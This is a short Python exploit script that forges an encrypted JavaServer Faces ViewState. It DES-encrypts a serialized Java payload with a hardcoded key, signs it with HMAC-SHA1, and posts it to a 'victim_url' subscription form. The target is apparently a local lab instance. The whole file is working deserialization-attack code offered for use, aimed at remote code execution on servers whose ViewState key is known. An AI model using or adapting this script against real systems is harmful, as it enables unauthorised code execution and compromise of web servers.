import base64
from Crypto.Cipher import DES
import hmac
import hashlib
import urllib
import requests

def padding_append(data):
    padding_length = 8 - (len(data) % 8)
    data += chr(padding_length) * padding_length
    return data

def encrypt_viewstate(viewstate, secret):
    secret = base64.b64decode(secret)
    des = DES.new(secret, DES.MODE_ECB)

    viewstate = padding_append(viewstate)
    viewstate_blocks = [viewstate[i:i+8] for i in range(0, len(viewstate), 8)]
    encrypted_blocks = [des.encrypt(block) for block in viewstate_blocks]
    encrypted_viewstate = b''.join(encrypted_blocks)
    hmac_digest = hmac.new(secret, encrypted_viewstate, hashlib.sha1).digest()
    encrypted_viewstate += hmac_digest
    return base64.b64encode(encrypted_viewstate).decode("ascii")

def create_payload():
    with open('payload_ping.ser', 'r') as fi:
        payload_ping = fi.read()
    payload = encrypt_viewstate(payload_ping, "SnNGOTg3Ni0=")
    payload = urllib.parse.quote(payload.encode("ascii"))
    return payload

victim_url = "http://127.0.0.1:8081/userSubscribe.faces"

post_data = "j_id_jsp_1623871077_1%3Aemail=test%40hello.com&j_id_jsp_1623871077_1%3Asubmit=SIGN+UP&j_id_jsp_1623871077_1_SUBMIT=1&javax.faces.ViewState="

payload = create_payload()

headers = {
    "Content-Type": "application/x-www-form-urlencoded"
}

response = requests.post(victim_url, data=post_data + payload, headers=headers)

print(response.text)
